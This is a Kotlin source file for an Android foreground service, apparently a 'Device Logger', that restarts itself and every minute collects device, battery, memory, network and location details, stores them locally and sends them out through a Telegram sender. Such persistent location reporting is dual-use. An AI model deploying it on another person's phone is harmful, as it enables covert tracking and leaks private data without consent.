package com.logger.android

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.text.SimpleDateFormat
import java.util.*

class LoggerService : Service() {
    
    private val serviceScope = CoroutineScope(Dispatchers.IO)
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, createNotification())
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startLogging()
        return START_STICKY
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "logger_channel",
                "Device Logger",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "logger_channel")
            .setContentTitle("Device Logger")
            .setContentText("Monitoring device...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }
    
    private fun startLogging() {
        serviceScope.launch {
            while (isActive) {
                try {
                    val logData = collectLogData()
                    FileLogger.writeLog(this@LoggerService, logData)
                    
                    if (NetworkUtils.isInternetAvailable(this@LoggerService)) {
                        TelegramSender.sendLog(logData)
                    }
                    
                    delay(60000) // 1 minute
                } catch (e: Exception) {
                    delay(30000) // Wait 30 seconds on error
                }
            }
        }
    }
    
    private fun collectLogData(): String {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
        
        return """
            📱 DEVICE LOGGER REPORT
            ⏰ TIMESTAMP: $timestamp
            
            ${DeviceInfoUtils.getDeviceInfo(this)}
            ${BatteryUtils.getBatteryInfo(this)}
            ${MemoryUtils.getMemoryInfo(this)}
            ${NetworkUtils.getNetworkInfo(this)}
            ${LocationUtils.getLocationInfo(this)}
            
            === END OF REPORT ===
        """.trimIndent()
    }
    
    override fun onDestroy() {
        serviceScope.cancel()
        super.onDestroy()
    }
}
